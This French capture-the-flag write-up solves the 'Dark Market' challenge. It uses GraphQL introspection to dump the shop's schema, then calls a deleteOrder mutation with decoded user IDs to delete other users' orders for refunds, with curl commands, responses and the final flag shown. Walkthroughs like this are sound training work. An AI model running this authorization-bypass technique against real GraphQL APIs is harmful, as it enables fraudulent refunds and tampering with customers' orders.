# Dark Market

Nous voilà face à une boutique en ligne.

D'après l'énnoncé, le but est d'acheter le flare gun.

Après avoir naviguer sur le site, on se rends compte que des requêtes graphQL sont effectuées.

On peut dumper le schéma complet grâce à cette requête : 

```
curl --Cookie "session=SESSIONCOOKIE"  http://defense.alieni.se:3002/graphql -X POST --data 'query={__schema {queryType { name }mutationType { name }subscriptionType { name }types {...FullType}directives {name 
description args {...InputValue}onOperation onFragment onField}}}fragment FullType on __Type {kind name 
description fields(includeDeprecated: true) {name description args {...InputValue}type {...TypeRef}isDeprecated 
deprecationReason}inputFields {...InputValue}interfaces {...TypeRef}enumValues(includeDeprecated: true) {name 
description isDeprecated deprecationReason}possibleTypes {...TypeRef}}fragment InputValue on __InputValue {name 
description type { ...TypeRef }defaultValue}fragment TypeRef on __Type {kind name ofType {kind name ofType {kind 
name ofType {kind name}}}}'

```

Les choses à retenir sont : 

Les deux méthodes findOrder et findProduct, ainsi que la mutation deleteOrder.

deleteOrder prends 2 arguments : un orderID ainsi qu'un userID

```
.....
"name":"MyMutations",   "description":null,  "fields":[    {                     
"name":"deleteOrder",   "description":null,   "args":[{
  "name":"orderId","description":null, "type":{"kind":"SCALAR","name":"String", "ofType":null},"defaultValue":null }, {                           
"name":"userId", "description":null,             
.....
```

Pour supprimer une commande, il faut dans un premier temps récuperer l'ID d'un user :

```
root@maze:~# curl --Cookie 
"session=SESSIONCOOKIE" 
http://defense.alieni.se:3002/graphql -X POST --data 
'query={findOrder(orderId:"5ee1e75f-e9e5-4119-b42e-5a20cb0a389e") {id user{name id}}}'


{"data":{"findOrder":{"id":"T3JkZXJzOjY0MA==","user":{"name":"fuu","id":"VXNlcnM6MTIzNg=="}}}}


```

On base64 decode l'id : 

```
root@maze:~# echo -n "VXNlcnM6MTIzNg==" | base64 -d
Users:1236

```

Puis on supprimer la commande : 

```
root@maze:~# curl --Cookie
"session=SESSIONCOOKIE"
 http://defense.alieni.se:3002/graphql -X POST --data 'query=mutation { deleteOrder(orderId: 
"5ee1e75f-e9e5-4119-b42e-5a20cb0a389e", userId: 1236){success} } '

{"data":{"success":true}}


```

La commande est supprimer, et nous avons été remboursé !

On va maintenant essayer de supprimer une commande mais faite par un autre.

Cela fonctionne ! On peut donc dépasser 100$ et acheter le flare gun, une fois fait, le flag est affiché.

SECT{__er0t1cally...4s 1f IT wer3__}



